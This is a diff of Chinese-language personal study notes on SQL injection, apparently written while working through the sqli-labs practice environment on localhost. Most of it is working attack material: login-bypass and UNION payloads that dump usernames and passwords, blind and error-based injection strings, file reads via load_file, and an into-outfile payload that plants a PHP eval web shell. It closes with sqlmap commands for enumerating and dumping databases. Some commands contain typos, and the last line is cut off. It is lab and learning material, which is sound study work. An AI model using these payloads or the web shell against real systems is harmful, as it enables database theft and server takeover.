@@ -1,20 +1,114 @@
 
 sql注入：
-	原理：
-		select * from admin where username='admin' or 1=1  -- 'and password='用户输入的密码'
+    原理：
+        select * from admin where username='admin' or 1=1  -- 'and password='用户输入的密码'
 
-	利用后台登录万能密码 
+    数字型 
+    字符型
 
-	
-	SQLmap：
-		探测：
-			sqlmap -r target.txt -p username --dbs
+    注入遇到的问题：
+        被添加斜杠：
+            尝试各种编码绕过
+            切换版本：
+                PHP 版本 5.4 起 magic_quotes_gpc 值为 false
 
-			sqlmap -u [url] --dbs  
+        输入反斜杠看报错信息可以获取闭合符号
 
-		指定数据库：
-			sqlmap -u [url] -D cms --tables
-		指定表：
-			sqlmap -u [url] -D cms -T articles --columns
-		指定字段：
-			sqlmap -u [url] -D cms -T articles -C id,title,content --dump
+    注入过程：
+        判断注入点：
+            1'
+        order by 判断字段数：
+            1%27 order by 3
+        union select 获取表名：
+            先判断显位：
+                0' union select 1,2,3
+            获取数据：
+                0%27 UNION select 1,group_concat(table_name),table_schema from information_schema.tables where table_schema=database()
+                user()
+                database()
+                version()
+        union select 获取列名：
+            0%27 UNION select 1,group_concat(column_name),3 from information_schema.columns where table_name=%27users%27
+        union select 获取字段值：
+            0%27 UNION select 1,group_concat(username, 0x3a, password),3 from users
+
+    SQL盲注：
+        时间盲注：
+            id=1%27%20and%20if(ascii(substr(database(),1,1))=115, 1, sleep(9))
+        布尔盲注：
+            id=1%27%20and%20length(database())>10
+
+    MySQL读写文件：
+        前提：
+            1. 权限足够
+            2. secure_file_priv 不为 null
+
+        绝对路径
+        读：
+            select load_file("e:\\flag.txt")
+        写：
+            把 '<?php phpinfo();?>' 写入了 1.php
+            ?id=-1')) union select 1, '<?php phpinfo();?>', 3 into outfile 'D:\\phpstudy\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.php' --+
+
+
+        过程：
+            查出字段：
+                1' order by 4       
+            查出显位：
+                -1' union select 1,2,3
+            在显位读入文件：
+                -1%27%20union select 1, load_file("d:\\flag.txt"),3
+
+            写入 webshell：
+                @ 符号屏蔽错误信息
+                    ?id=-1')) union select 1, '<?php @eval($_POST[x]); ?>', 3 into outfile 'D:\phpstudy\phpstudy\phpstudy_pro\WWW\sqli-labs\Less-7\2.php'
+                然后用中国菜刀连接？？？？？！！！！！
+
+    POST注入：
+        复制 BP 截断的 HTTP 请求数据包到文本文件
+        sqlmap -r 文件路径 -p 指定探测参数
+
+    报错注入：
+        select count(*) from table group by floor(rand(0)*2)
+        查询的时候如果使用 rand()，该值会被计算多次。在使用 group by 的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中floor(rand(0)*2)的值是定性的，为011011。
+        less-5/index.php?id=0' union select 1,2,3 from (select count(*), concat((select concat(version(), 0x3a, 0x3a, database(), 0x3a, 0x3a, user(), 0x3a) limit 0, 1), floor(rand(0)*2))x from information_schema.tables group by x)a --+
+
+    SQLmap： 
+        探测：
+            -u 探测url
+            --dbs 探测数据库
+            --current-db 查看当前数据库
+            -batch 默认选择
+            --technique T 指定探测技术 time
+            --file-read
+            --file-write
+            --file-dest
+
+            sqlmap.py -u [url] --dbs  
+            sqlmap.py -r target.txt -p username --dbs
+
+        指定数据库：
+            sqlmap.py -u [url] -D cms --tables
+        指定表：
+            sqlmap.py -u [url] -D cms -T articles --columns
+        指定字段：
+            sqlmap.py -u [url] -D cms -T articles -C id,title,content --dump
+
+
+        less-1实战：
+            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-1/?id=1" --dbs --batch
+            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-1/?id=1" -D securtiy --talbes --batch
+            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-1/?id=1" -D securtiy -T users --columnsd --batch
+            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-1/?id=1" -D security -T users -C "username, password" --dump
+
+        less-9实战：
+            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-9/?id=1" --technique T --dbs --batch
+
+        less-7读写文件实战：
+            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-7/?id=1" --file-read "d:\\flag.txt"
+            
+        POST注入：
+            sqlmap.py -r target.txt -p username --current-db
+
+        less-6:
+            sqlmpa.py -u 
